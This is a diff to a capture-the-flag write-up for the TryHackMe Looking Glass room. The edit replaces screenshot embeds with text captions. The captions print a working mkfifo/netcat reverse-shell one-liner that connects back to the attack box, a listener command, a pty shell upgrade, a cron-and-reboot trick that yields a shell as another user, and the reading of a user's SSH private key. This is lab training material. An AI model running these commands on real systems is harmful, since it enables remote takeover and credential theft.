@@ -178,7 +178,7 @@ Verify:
 cat twasBrillig.sh
 ```
 
-![Modified twasBrillig.sh — now contains rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.230 4444 >/tmp/f.](/writeups/thm-looking-glass/13-twasbrillig-reverse-shell.png)
+> Modified `twasBrillig.sh` — now contains `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.230 4444 >/tmp/f`.
 
 ### Catching the shell
 
@@ -188,7 +188,7 @@ Set up the listener on the attack box:
 nc -lvnp 4444
 ```
 
-![Netcat listener waiting on port 4444.](/writeups/thm-looking-glass/14-nc-listener.png)
+> Netcat listener waiting on port 4444.
 
 Trigger the reboot from the target:
 
@@ -198,7 +198,7 @@ sudo /sbin/reboot
 
 The machine restarts, tweedledum's cron job fires, and the reverse shell connects:
 
-![Reverse shell caught — connect from 10.10.33.199:42858, whoami confirms tweedledum. Shell upgraded with python3 -c 'import pty;pty.spawn("/bin/bash")'.](/writeups/thm-looking-glass/15-tweedledum-shell.png)
+> Reverse shell caught — connect from 10.10.33.199:42858, `whoami` confirms `tweedledum`. Shell upgraded with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
 
 We're now **tweedledum**. The raw shell gets upgraded immediately:
 
@@ -218,7 +218,7 @@ Humptydumpty's key discovery: the `/home` directory is world-executable, and hum
 cd /home/alice/.ssh
 ```
 
-![humptydumpty@looking-glass navigating to /home/alice/.ssh — directory is accessible.](/writeups/thm-looking-glass/16-humptydumpty-alice-ssh.png)
+> `humptydumpty@looking-glass` navigating to `/home/alice/.ssh` — directory is accessible.
 
 Inside alice's `.ssh` directory sits her **id_rsa** private key. Reading it and using it to SSH in as alice:
 
